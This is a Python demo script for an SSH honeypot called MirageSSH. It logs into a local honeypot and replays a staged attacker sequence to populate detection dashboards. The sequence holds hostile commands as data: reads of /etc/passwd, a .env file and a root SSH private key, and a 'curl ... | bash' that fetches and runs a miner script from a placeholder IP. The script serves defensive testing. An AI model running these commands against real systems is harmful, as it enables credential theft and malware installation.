"""
MirageSSH - Automated Attacker Simulation Demo Script
Simulates realistic multi-stage adversarial tradecraft against the honeypot,
populating real-time telemetry, MITRE ATT&CK analytics, and Honeytoken alerts.
"""

from __future__ import annotations
import sys
import time

try:
    import paramiko
except ImportError:
    print("Paramiko is required. Run: pip install paramiko")
    sys.exit(1)


ATTACK_STAGES = [
    ("Stage 1: System Reconnaissance", "whoami"),
    ("Stage 1: System Reconnaissance", "id"),
    ("Stage 1: System Reconnaissance", "uname -a"),
    ("Stage 1: System Reconnaissance", "uptime"),
    ("Stage 1: System Reconnaissance", "ip a"),
    ("Stage 2: Account & Process Discovery", "cat /etc/passwd"),
    ("Stage 2: Account & Process Discovery", "ps aux"),
    ("Stage 2: Account & Process Discovery", "netstat -tulnp"),
    ("Stage 3: SUID Privilege Escalation Hunting", "find / -perm -4000 2>/dev/null"),
    ("Stage 3: SUID Privilege Escalation Hunting", "sudo -l"),
    ("Stage 4: Honeytoken Credential Theft", "cat /home/ubuntu/.env"),
    ("Stage 4: Honeytoken Credential Theft", "cat /root/.ssh/id_rsa"),
    ("Stage 5: Ingress Tool Transfer / Dropper", "curl -s http://198.51.100.24/stage2_miner.sh | bash"),
    ("Stage 6: Persistence Inspection", "crontab -l"),
    ("Stage 7: Cleanup & Disconnect", "history"),
    ("Stage 7: Cleanup & Disconnect", "exit"),
]


def run_attack_simulation(host: str = "127.0.0.1", port: int = 2222, username: str = "ubuntu", password: str = "ubuntu"):
    print("=" * 65)
    print(f"[*] Starting MirageSSH Attack Simulation against {host}:{port}")
    print("=" * 65)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Step 1: Connect
    try:
        print(f"[*] Authenticating as '{username}'...")
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
        print("[+] SSH Authentication Successful!\n")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    # Step 2: Open interactive shell channel
    channel = client.invoke_shell(term="xterm", width=80, height=24)
    time.sleep(1.0)

    # Read banner & initial prompt
    initial_banner = ""
    while channel.recv_ready():
        initial_banner += channel.recv(1024).decode("utf-8", errors="ignore")
    print(initial_banner.strip())
    print("\n" + "-" * 65 + "\n")

    # Step 3: Execute attack sequence
    for stage_name, cmd in ATTACK_STAGES:
        print(f"\n[>>] [{stage_name}] Executing: {cmd}")
        channel.send(cmd + "\n")
        time.sleep(1.2)

        output = ""
        while channel.recv_ready():
            output += channel.recv(2048).decode("utf-8", errors="ignore")

        # Clean output display
        lines = [line for line in output.splitlines() if line.strip()]
        for line in lines[:8]:  # Print first few lines of response
            print(f"    | {line}")
        if len(lines) > 8:
            print(f"    | ... ({len(lines) - 8} more lines)")

        if cmd == "exit":
            break

    channel.close()
    client.close()
    print("\n" + "=" * 65)
    print("[+] Attack simulation complete! Check the Web SOC dashboard for live analytics.")
    print("=" * 65)


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 2222
    run_attack_simulation(host=h, port=p)
